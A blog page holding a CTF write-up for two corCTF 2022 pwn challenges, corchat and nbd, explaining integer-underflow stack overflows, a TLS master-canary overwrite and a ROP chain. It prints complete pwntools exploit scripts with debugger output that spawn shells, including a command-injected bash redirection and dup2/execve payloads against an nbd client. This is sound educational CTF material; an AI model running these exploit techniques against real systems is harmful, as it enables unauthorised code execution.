<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>corCTF 2022 - corchat, nbd | pivik</title>
<meta name="keywords" content="">
<meta name="description" content="I played corCTF last week with my team purf3ct and managed to solve 4 pwn challenges. Here are my writeups for some of them.
All of my exploit scripts can be found here.
corchat: Category: pwn Points: 334 Solves: 10 Description: Can you pwn our internal, terribly written, chat program? Overview The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:">
<meta name="author" content="">
<link rel="canonical" href="https://pivik271.github.io/posts/corctf2022/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css" integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://pivik271.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://pivik271.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://pivik271.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://pivik271.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://pivik271.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="corCTF 2022 - corchat, nbd" />
<meta property="og:description" content="I played corCTF last week with my team purf3ct and managed to solve 4 pwn challenges. Here are my writeups for some of them.
All of my exploit scripts can be found here.
corchat: Category: pwn Points: 334 Solves: 10 Description: Can you pwn our internal, terribly written, chat program? Overview The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://pivik271.github.io/posts/corctf2022/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-08-08T17:24:22+07:00" />
<meta property="article:modified_time" content="2022-08-08T17:24:22+07:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="corCTF 2022 - corchat, nbd"/>
<meta name="twitter:description" content="I played corCTF last week with my team purf3ct and managed to solve 4 pwn challenges. Here are my writeups for some of them.
All of my exploit scripts can be found here.
corchat: Category: pwn Points: 334 Solves: 10 Description: Can you pwn our internal, terribly written, chat program? Overview The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://pivik271.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "corCTF 2022 - corchat, nbd",
      "item": "https://pivik271.github.io/posts/corctf2022/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "corCTF 2022 - corchat, nbd",
  "name": "corCTF 2022 - corchat, nbd",
  "description": "I played corCTF last week with my team purf3ct and managed to solve 4 pwn challenges. Here are my writeups for some of them.\nAll of my exploit scripts can be found here.\ncorchat: Category: pwn Points: 334 Solves: 10 Description: Can you pwn our internal, terribly written, chat program? Overview The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:",
  "keywords": [
    
  ],
  "articleBody": "I played corCTF last week with my team purf3ct and managed to solve 4 pwn challenges. Here are my writeups for some of them.\nAll of my exploit scripts can be found here.\ncorchat: Category: pwn Points: 334 Solves: 10 Description: Can you pwn our internal, terribly written, chat program? Overview The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:\nSET_UNAME: set your username. GET_UNAME: get your username. _SEND_MSG: send your message. GETSTATUS: execute top -n 1 if you are admin. Digging into the source code After taking a deeper look into the source code, I found a bug in Crusader::RecvMessage() function.\nstd::string Crusader::RecvMessage() { std::string msg = \"\"; cor_msg_buf msg_buf; memset(msg_buf.buffer, '\\x00', sizeof(msg_buf.buffer)); if (read(this-\u003em_sock_fd, \u0026msg_buf.len, sizeof(msg_buf.len)) \u003c= 0) return msg; if (msg_buf.len \u003e= sizeof(msg_buf.buffer) || msg_buf.len == 0) return msg; if (read(this-\u003em_sock_fd, \u0026msg_buf.flags, sizeof(msg_buf.flags)) \u003c= 0) return msg; msg_buf.len -= sizeof(msg_buf.flags); if (msg_buf.len \u003c= 0) return msg; if (read(this-\u003em_sock_fd, msg_buf.buffer, msg_buf.len) \u003c= 0) return msg; msg_buf.buffer[msg_buf.len] = '\\x00'; msg += msg_buf.buffer; return msg; } Here msg_buf holds the struct cor_msg_buf data type.\ntypedef struct { char buffer[1024]; uint16_t flags; uint16_t len; } cor_msg_buf; As we can see, the type of msg_buf.len is uint16_t, which is an unsigned number, so the check below can never happen.\nstd::string Crusader::RecvMessage() ... msg_buf.len -= sizeof(msg_buf.flags); if (msg_buf.len \u003c= 0) return msg; ... Since sizeof(msg_buf.flags) == 2, if we set msg_buf.len to 1, then after msg_buf.len -= sizeof(msg_buf.flags), msg_buf.len will become 0xffff, which leads to a buffer overflow.\nBOF Now we have a stack buffer overflow, but PIE is enabled and there’s also a stack canary, so if we want to build a rop chain, some leaks are required. Unfortunately, I can’t find any easy way to leak, so I chose to partial overwrite the return address of Crusader::RecvMessage().\nWith ASLR turned off, the return address is 0x55555555964f, searching around that address, I found out at address 0x555555559611 is a call to DoAdmin function. DoAdmin first argument is the command to be executed, and luckily when Crusader::RecvMessage() returns, RDI is now holding the address of our buffer. So we can execute arbitrary system command.\nHowever, before we can reach the return address, there’s one more thing we need to resolve, which is stack canary. As I mentioned earlier, I didn’t see anything could be used for leaking. But looking again at the source code, we can see a new thread is spawned to call ChatServer::RecvCrusaderMessages function.\nvoid ChatServer::MainLoop() { int8_t new_socket, new_crusader_idx; std::string welcome_msg; pthread_t tid; pthread_create(\u0026tid, NULL, \u0026ChatServer::RecvCrusaderMessages, this); ... The interesting part about threaded function is that the Thread Local Storage (TLS) will be located near the thread stack. You can read more about TLS here. So if we have enough overflow, we can overwrite the master canary.\ndef send_msg(msglen, flags, msg): payload = b'_SEND_MSG' payload += p16(msglen) payload += p16(flags) payload += msg p.send(payload) payload = b'a'*0x408 payload += b'b'*8\t# stack canary payload += b'a'*0x18 payload += b'c'*8\t# return address payload = payload.ljust(0xd78, b'\\x00') payload += b'b'*8\t# overwritten master canary send_msg(1, 1, payload) *RAX 0x0 RBX 0x0 RCX 0x555555571ed0 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaacccccccc' RDX 0x10 RDI 0x555555571ac0 ◂— 0x6161616161616161 ('aaaaaaaa') RSI 0x7ffff7a27dd0 ◂— 'aaaaaaaacccccccc' R8 0xffffffffffffffe0 R9 0x7ffff7d69e70 (main_arena+752) —▸ 0x7ffff7d69e60 (main_arena+736) —▸ 0x7ffff7d69e50 (main_arena+720) —▸ 0x7ffff7d69e40 (main_arena+704) —▸ 0x7ffff7d69e30 (main_arena+688) ◂— ... R10 0x7ffff00008d0 ◂— 0x0 R11 0x555555571ac0 ◂— 0x6161616161616161 ('aaaaaaaa') R12 0xa R13 0x0 R14 0xa R15 0x0 RBP 0x7ffff7a27dd0 ◂— 'aaaaaaaacccccccc' RSP 0x7ffff7a27990 —▸ 0x555555571a60 ◂— 0x0 *RIP 0x55555555a208 (Crusader::RecvMessage[abi:cxx11]()+466) ◂— je 0x55555555a20f ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x55555555a1a2 mov rdi, rax 0x55555555a1a5 call 0x5555555576d0 \u003c0x5555555576d0\u003e 0x55555555a1aa jmp Crusader::RecvMessage[abi:cxx11]()+453 ↓ 0x55555555a1fb mov rax, qword ptr [rbp - 0x18] 0x55555555a1ff xor rax, qword ptr fs:[0x28] ► 0x55555555a208 ✔ je Crusader::RecvMessage[abi:cxx11]()+473 ↓ 0x55555555a20f mov rax, qword ptr [rbp - 0x438] 0x55555555a216 add rsp, 0x438 0x55555555a21d pop rbx 0x55555555a21e pop rbp 0x55555555a21f ret ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffff7a27990 —▸ 0x555555571a60 ◂— 0x0 01:0008│ 0x7ffff7a27998 —▸ 0x7ffff7a27e90 —▸ 0x555555571ac0 ◂— 0x6161616161616161 ('aaaaaaaa') 02:0010│ 0x7ffff7a279a0 ◂— 0x0 03:0018│ 0x7ffff7a279a8 ◂— 0x0 04:0020│ 0x7ffff7a279b0 ◂— 0x6161616161616161 ('aaaaaaaa') ... ↓ 3 skipped ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x55555555a208 Crusader::RecvMessage[abi:cxx11]()+466 f 1 0x6363636363636363 f 2 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e Another problem? Now we can bypass canary. But here comes another problem.\nRAX 0x7ffff7a27e90 —▸ 0x555555571ac0 ◂— 0x6161616161616161 ('aaaaaaaa') RBX 0x6161616161616161 ('aaaaaaaa') RCX 0x555555571ed0 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaacccccccc' RDX 0x10 RDI 0x555555571ac0 ◂— 0x6161616161616161 ('aaaaaaaa') RSI 0x7ffff7a27dd0 ◂— 'aaaaaaaacccccccc' R8 0xffffffffffffffe0 R9 0x7ffff7d69e70 (main_arena+752) —▸ 0x7ffff7d69e60 (main_arena+736) —▸ 0x7ffff7d69e50 (main_arena+720) —▸ 0x7ffff7d69e40 (main_arena+704) —▸ 0x7ffff7d69e30 (main_arena+688) ◂— ... R10 0x7ffff00008d0 ◂— 0x0 R11 0x555555571ac0 ◂— 0x6161616161616161 ('aaaaaaaa') R12 0xa R13 0x0 R14 0xa R15 0x0 *RBP 0x6161616161616161 ('aaaaaaaa') *RSP 0x7ffff7a27dd8 ◂— 'cccccccc' *RIP 0x55555555a21f (Crusader::RecvMessage[abi:cxx11]()+489) ◂— ret ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x55555555a208 je Crusader::RecvMessage[abi:cxx11]()+473 ↓ 0x55555555a20f mov rax, qword ptr [rbp - 0x438] 0x55555555a216 add rsp, 0x438 0x55555555a21d pop rbx 0x55555555a21e pop rbp ► 0x55555555a21f ret \u003c0x6363636363636363\u003e ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffff7a27dd8 ◂— 'cccccccc' 01:0008│ 0x7ffff7a27de0 ◂— 0x0 ... ↓ 6 skipped ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x55555555a21f Crusader::RecvMessage[abi:cxx11]()+489 f 1 0x6363636363636363 f 2 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e As you can see, we have to overwrite full 8 bytes of the return address in order to reach the master canary. Again, we don’t have any leaks, so this is probably not what we expect.\nIf we notice, msg_buf.buffer is at [rbp - 0x420] and msg_buf.len is at [rbp - 0x1e], which means we can overwrite msg_buf.len to a controlled value.\nstd::string Crusader::RecvMessage() ... msg_buf.buffer[msg_buf.len] = '\\x00'; msg += msg_buf.buffer; ... My approach is to overwrite the master canary one byte at a time. After 7 times, we can change canary to 0 without having to touch the return address.\nFinal script from pwn import * # p = remote('localhost', 9999) p = remote('pwn-corchat-b293bf49f31ff8e3.be.ax', 1337, ssl=True) def send_msg(msglen, flags, msg): payload = b'_SEND_MSG' payload += p16(msglen) payload += p16(flags) payload += msg p.send(payload) for i in range(1, 8): payload = b'a'*0x402 payload += p16(i + 0xd78) payload += b'\\x00'*4 payload += b'\\x00'*(i + 1) sleep(0.5) send_msg(1, 1, payload) cmd = b'/bin/bash 0\u003e\u00264 1\u003e\u00264 2\u003e\u00264' payload = cmd payload += b';' payload = payload.ljust(0x402, b'a') payload += p16(0x420) payload += b'\\x00'*4 payload += p64(0)*4 payload += b'\\x11' sleep(0.5) send_msg(1, 1, payload) p.interactive() $ python3 solve.py [+] Opening connection to pwn-corchat-b293bf49f31ff8e3.be.ax on port 1337: Done [*] Switching to interactive mode Welcome to CoRChat! $ id uid=1000(ctf) gid=1000(ctf) groups=1000(ctf) $ ls corchat_server flag.txt $ cat flag.txt corctf{pThr34D_g03s_brrrr} nbd: Category: pwn Points: 362 Solves: 8 Description: You pwned the server in 4th Real World CTF, can you pwn the client now? I didn’t work on this challenge until my teammate hit me up telling me a suspicious function.\nvoid ask_list(int sock) { uint32_t opt_server; uint32_t len; uint32_t lenn; uint32_t reptype; uint64_t magic; int rlen; const int BUF_SIZE = 1024; char buf[BUF_SIZE]; send_request(sock, NBD_OPT_LIST, 0, NULL); /* newline, move away from the \"Negotiation:\" line */ printf(\"\\n\"); do { memset(buf, 0, 1024); if(read(sock, \u0026magic, sizeof(magic)) \u003c 0) { err(\"Reading magic from server: %m\"); } if(read(sock, \u0026opt_server, sizeof(opt_server)) \u003c 0) { err(\"Reading option: %m\"); } if(read(sock, \u0026reptype, sizeof(reptype)) \u003c0) { err(\"Reading reply from server: %m\"); } if(read(sock, \u0026len, sizeof(len)) \u003c 0) { err(\"Reading length from server: %m\"); } magic=ntohll(magic); len=ntohl(len); reptype=ntohl(reptype); if(magic != rep_magic) { err(\"Not enough magic from server\"); } if(reptype \u0026 NBD_REP_FLAG_ERROR) { switch(reptype) { case NBD_REP_ERR_POLICY: fprintf(stderr, \"\\nE: listing not allowed by server.\\n\"); break; default: fprintf(stderr, \"\\nE: unexpected error from server.\\n\"); break; } if(len \u003e 0 \u0026\u0026 len \u003c BUF_SIZE) { if((rlen=read(sock, buf, len)) \u003c 0) { fprintf(stderr, \"\\nE: could not read error message from server\\n\"); } else { buf[rlen] = '\\0'; fprintf(stderr, \"Server said: %s\\n\", buf); } } exit(EXIT_FAILURE); } else { if(reptype != NBD_REP_ACK) { if(reptype != NBD_REP_SERVER) { err(\"Server sent us a reply we don't understand!\"); } if(read(sock, \u0026lenn, sizeof(lenn)) \u003c 0) { fprintf(stderr, \"\\nE: could not read export name length from server\\n\"); exit(EXIT_FAILURE); } lenn=ntohl(lenn); if (lenn \u003e= BUF_SIZE) { fprintf(stderr, \"\\nE: export name on server too long\\n\"); exit(EXIT_FAILURE); } if(read(sock, buf, lenn) \u003c 0) { fprintf(stderr, \"\\nE: could not read export name from server\\n\"); exit(EXIT_FAILURE); } buf[lenn] = 0; printf(\"%s\", buf); len -= lenn; len -= sizeof(lenn); if(len \u003e 0) { if(read(sock, buf, len) \u003c 0) { fprintf(stderr, \"\\nE: could not read export description from server\\n\"); exit(EXIT_FAILURE); } buf[len] = 0; printf(\": %s\\n\", buf); } else { printf(\"\\n\"); } } } } while(reptype != NBD_REP_ACK); send_request(sock, NBD_OPT_ABORT, 0, NULL); } len has uint32_t data type, so it’s always greater than 0. There’s also no check for len and it is a controllable variable. Basically we have a stack buffer overflow here.\nBecause the binary has no PIE, it becomes a normal rop challenge.\nask_list gets called inside negotiate.\nvoid negotiate(int *sockp, u64 *rsize64, uint16_t *flags, char* name, uint32_t needed_flags, uint32_t client_flags, uint32_t do_opts, char *certfile, char *keyfile, char *cacertfile, char *tlshostname, bool tls, bool can_opt_go) { ... if(do_opts \u0026 NBDC_DO_LIST) { ask_list(sock); exit(EXIT_SUCCESS); } ... and negotiate is called here in main:\nint main(int argc, char *argv[]) { ... if (!preinit) negotiate(\u0026sock, \u0026size64, \u0026flags, name, needed_flags, cflags, opts, certfile, keyfile, cacertfile, tlshostname, tls, can_opt_go); ... Inside negotiate function, we need to bypass some checks:\nprintf(\"Negotiation: \"); readit(sock, buf, 8); if (strcmp(buf, INIT_PASSWD))\t// INIT_PASSWD is \"NBDMAGIC\" err(\"INIT_PASSWD bad\"); ... readit(sock, \u0026tmp, sizeof(uint16_t)); global_flags = ntohs(tmp); if((needed_flags \u0026 global_flags) != needed_flags) {\t// need to pass this check too /* There's currently really only one reason why this * check could possibly fail, but we may need to change * this error message in the future... */ fprintf(stderr, \"\\nE: Server does not support listing exports\\n\"); exit(EXIT_FAILURE); } And some more checks inside ask_list:\nif(magic != rep_magic) { err(\"Not enough magic from server\"); } if(reptype \u0026 NBD_REP_FLAG_ERROR) {\t// We don't want to go into this if branch ... } else { if(reptype != NBD_REP_SERVER) // reptype should be equal to NBD_REP_SERVER err(\"Server sent us a reply we don't understand!\"); } For the ropchain, I use write syscall to leak libc, and finally use dup2/execve to spawn a shell.\nFinal script: from pwn import * elf = ELF('./nbd-client') libc = ELF('./libc-2.31.so') p = process(['nc', '-lnvp', '9999']) pause() p.send(b'NBDMAGIC') # INIT_PASSWD p.send(b'IHAVEOPT'[::-1]) p.send(b'\\x00\\x01') # tmp p.send(p64(0xa965550489e80300)) # rep_magic p.send(b'a'*4) # opt_server p.send(b'\\x00\\x00\\x00\\x02') # reptype p.send(b'\\x00\\x00\\x10\\x00') # len p.send(b'\\x00\\x00\\x01\\x00') # lenn p.sendline(b'') sleep(0.5) pop_rdi = 0x402b56 pop_rsi = 0x40419d payload = b'\\x00'*0x424 payload += p32(1) payload += b'\\x00'*0x40 payload += p64(pop_rdi) payload += p64(3) payload += p64(pop_rsi) payload += p64(elf.got['read']) payload += p64(elf.sym['write']) payload += p64(0x00404360) p.send(payload) libc.address = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) - libc.sym['read'] print(hex(libc.address)) system = libc.sym['system'] pop_rax = libc.address + 0x36174 pop_rdx = libc.address + 0x142c92 syscall = libc.address + 0x630a9 bin_sh = next(libc.search(b'/bin/sh')) p.send(p64(0xa965550489e80300)) # rep_magic p.send(b'a'*4) # opt_server p.send(b'\\x00\\x00\\x00\\x02') # reptype p.send(b'\\x00\\x00\\x10\\x00') # len p.send(b'\\x00\\x00\\x01\\x00') # lenn p.sendline(b'') sleep(0.5) payload = b'\\x00'*0x424 payload += p32(1) payload += b'\\x00'*0x40 payload += p64(pop_rdi) payload += p64(3) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rax) payload += p64(33) payload += p64(syscall) payload += p64(pop_rsi) payload += p64(1) payload += p64(pop_rax) payload += p64(33) payload += p64(syscall) payload += p64(pop_rsi) payload += p64(2) payload += p64(pop_rax) payload += p64(33) payload += p64(syscall) payload += p64(pop_rdi) payload += p64(bin_sh) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.send(payload) p.recvrepeat(0.5) p.interactive() $ python3 solve.py [*] '/home/pivik/CTF/2022/cor/pwn/nbd/nbd-client' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) FORTIFY: Enabled [*] '/home/pivik/CTF/2022/cor/pwn/nbd/libc-2.31.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process '/usr/bin/nc': pid 8951 [*] Paused (press any to continue) 0x7f2eaaec2000 [*] Switching to interactive mode $ id uid=1000(ctf) gid=1000(ctf) groups=1000(ctf) $ ls flag.txt nbd-client serv.py $ cat flag.txt corctf{ch3cK-y0UR_v4R14Bl3$!!11!111} ",
  "wordCount" : "1962",
  "inLanguage": "en",
  "datePublished": "2022-08-08T17:24:22+07:00",
  "dateModified": "2022-08-08T17:24:22+07:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://pivik271.github.io/posts/corctf2022/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "pivik",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pivik271.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://pivik271.github.io/" accesskey="h" title="pivik (Alt + H)">pivik</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://pivik271.github.io/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://pivik271.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://pivik271.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      corCTF 2022 - corchat, nbd
    </h1>
    <div class="post-meta"><span title='2022-08-08 17:24:22 +0700 +07'>August 8, 2022</span>&nbsp;·&nbsp;10 min

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#corchat" aria-label="corchat:">corchat:</a><ul>
                        
                <li>
                    <a href="#overview" aria-label="Overview">Overview</a></li>
                <li>
                    <a href="#digging-into-the-source-code" aria-label="Digging into the source code">Digging into the source code</a></li>
                <li>
                    <a href="#bof" aria-label="BOF">BOF</a></li>
                <li>
                    <a href="#another-problem" aria-label="Another problem?">Another problem?</a></li>
                <li>
                    <a href="#final-script" aria-label="Final script">Final script</a></li></ul>
                </li>
                <li>
                    <a href="#nbd" aria-label="nbd:">nbd:</a><ul>
                        
                <li>
                    <a href="#final-script-1" aria-label="Final script:">Final script:</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>I played corCTF last week with my team <code>purf3ct</code> and managed to solve 4 pwn challenges. Here are my writeups for some of them.</p>
<p>All of my exploit scripts can be found <a href="https://github.com/pivik271/ctf-writeups/tree/main/2022/corCTF">here</a>.</p>
<h1 id="corchat">corchat:<a hidden class="anchor" aria-hidden="true" href="#corchat">#</a></h1>
<ul>
<li>Category: pwn</li>
<li>Points: 334</li>
<li>Solves: 10</li>
<li>Description: Can you pwn our internal, terribly written, chat program?</li>
</ul>
<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
<p>The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:</p>
<ul>
<li>SET_UNAME: set your username.</li>
<li>GET_UNAME: get your username.</li>
<li>_SEND_MSG: send your message.</li>
<li>GETSTATUS: execute <code>top -n 1</code> if you are admin.</li>
</ul>
<h2 id="digging-into-the-source-code">Digging into the source code<a hidden class="anchor" aria-hidden="true" href="#digging-into-the-source-code">#</a></h2>
<p>After taking a deeper look into the source code, I found a bug in <code>Crusader::RecvMessage()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string Crusader<span style="color:#f92672">::</span>RecvMessage()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    cor_msg_buf msg_buf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memset(msg_buf.buffer, <span style="color:#e6db74">&#39;\x00&#39;</span>, <span style="color:#66d9ef">sizeof</span>(msg_buf.buffer));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (read(this<span style="color:#f92672">-&gt;</span>m_sock_fd, <span style="color:#f92672">&amp;</span>msg_buf.len, <span style="color:#66d9ef">sizeof</span>(msg_buf.len)) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> msg;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (msg_buf.len <span style="color:#f92672">&gt;=</span> <span style="color:#66d9ef">sizeof</span>(msg_buf.buffer) <span style="color:#f92672">||</span> msg_buf.len <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> msg;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (read(this<span style="color:#f92672">-&gt;</span>m_sock_fd, <span style="color:#f92672">&amp;</span>msg_buf.flags, <span style="color:#66d9ef">sizeof</span>(msg_buf.flags)) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> msg;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    msg_buf.len <span style="color:#f92672">-=</span> <span style="color:#66d9ef">sizeof</span>(msg_buf.flags);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (msg_buf.len <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> msg;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (read(this<span style="color:#f92672">-&gt;</span>m_sock_fd, msg_buf.buffer, msg_buf.len) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> msg;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    msg_buf.buffer[msg_buf.len] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\x00&#39;</span>;
</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">+=</span> msg_buf.buffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> msg;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here <code>msg_buf</code> holds the struct <code>cor_msg_buf</code> data type.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">1024</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> flags;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> len;
</span></span><span style="display:flex;"><span>} cor_msg_buf;
</span></span></code></pre></div><p>As we can see, the type of <code>msg_buf.len</code> is <code>uint16_t</code>, which is an unsigned number, so the check below can never happen.</p>
